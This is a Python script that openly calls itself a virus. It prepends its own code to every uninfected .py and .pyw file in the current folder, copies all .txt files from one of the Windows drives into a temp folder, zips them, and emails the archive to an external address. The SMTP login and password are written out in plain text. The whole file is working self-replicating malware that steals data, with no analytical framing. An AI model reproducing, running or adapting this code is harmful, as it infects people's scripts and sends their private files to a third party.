### THE VIRUS STARTS HERE ###
import glob, sys, threading, string, os, shutil 
from ctypes import windll
code = []


def getVcode():

# open this file,read every lines and find the virus area
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    virus_area = False
    for line in lines:
        if line == '### THE VIRUS STARTS HERE ###\n':
            virus_area = True
        if virus_area:
            code.append(line)
        if line == '### THE VIRUS ENDS HERE ###\n':
            break
#print(line)    
#print(code)
# open every files and write the replicate code

def injectCode():
    python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

    for script in python_scripts: 
        with open(script, 'r') as f:
            script_code = f.readlines()

        infected = False
        for line in script_code:
            if line == '### THE VIRUS STARTS HERE ###\n':
                infected = True
                break
    
        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script, 'w') as f:
                f.writelines(final_code)

# get the list of drives
def get_drives(): 
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1
    return drives


getVcode()
injectCode()

#### Malicious piece of code #####

## create a temp folder in the first drive
drives = get_drives()
access = drives[2] + ':\\tempVirus' 
filesToSend = []

if not os.path.exists(access):
        os.makedirs(access)

## copy files to the temp folder
src_dir = drives[2] + ':\\'
dst_dir = access
filePath = ''
for dirpath, subdirs, files in os.walk(src_dir):
    for x in files:
        if x.endswith(".txt"):
            #shpfiles.append(os.path.join(dirpath, x))
            try:
                filePath = os.path.join(dirpath, x)
                #print(filePath)
                shutil.copy(filePath, dst_dir)
            except shutil.SameFileError:
                pass

# zip the folder 
filesToSend.append(shutil.make_archive('virusData', 'zip', access)) 

# Send the email

import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate


import smtplib
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders


def send_mail(send_from, send_to, subject, message, files=[],
              server="localhost", port=587, username='', password='',
              use_tls=True):
    """Compose and send email with provided info and attachments.

    Args:
        send_from (str): from name
        send_to (list[str]): to name(s)
        subject (str): message title
        message (str): message body
        files (list[str]): list of file paths to be attached to email
        server (str): mail server host name
        port (int): port number
        username (str): server auth username
        password (str): server auth password
        use_tls (bool): use TLS mode
    """
    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = COMMASPACE.join(send_to)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach(MIMEText(message))

    for path in files:
        part = MIMEBase('application', "octet-stream")
        with open(path, 'rb') as file:
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        'attachment; filename="{}"'.format(Path(path).name))
        msg.attach(part)

    smtp = smtplib.SMTP(server, port)
    if use_tls:
        smtp.starttls()
    smtp.login(username, password)
    smtp.sendmail(send_from, send_to, msg.as_string())
    smtp.quit()


send_mail('quan.thai@toanthangcar.com', 'quan.thai1987@gmail.com','Testing','Testing',filesToSend,server='pro44.emailserver.vn', port=587, username= 'quan.thai@toanthangcar.com', password = 'Toanthang2019#', use_tls=False)

print (src_dir,dst_dir)

### THE VIRUS ENDS HERE ###
